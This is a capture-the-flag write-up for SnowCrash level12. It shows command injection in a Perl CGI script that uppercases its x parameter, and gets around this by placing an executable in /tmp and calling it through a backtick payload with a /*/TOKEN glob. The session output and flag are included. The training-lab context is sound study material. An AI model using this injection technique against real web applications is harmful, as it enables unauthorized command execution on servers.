### Exploit

Yet another Perl script with unprotected parameters. Do they ever learn? Yet this time around, we can't simply call getflag through parameter __x__, as the str argument "getflag" is to be transformed in to "GETFLAG" because of this line:
> $xx =~ tr/a-z/A-Z/;

In order to avoid this issue, simply write a script which will call getflag and write the result in another file.

```
    level12@SnowCrash:~$ cat /tmp/TOKEN
    #!/bin/sh
    getflag > /tmp/key
    level12@SnowCrash:~$ chmod +x /tmp/TOKEN
    level12@SnowCrash:~$ ls -l /tmp/TOKEN
    -rwxrwxr-x 1 level12 level12 29 Jan 19 13:11 /tmp/TOKEN
```
> http://[IP_ADDRESS]:4646/?x="`/*/TOKEN`"

```
    level12@SnowCrash:~$ cat /tmp/key
    Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

This works thanks to globbing. The proof is in the pudding...
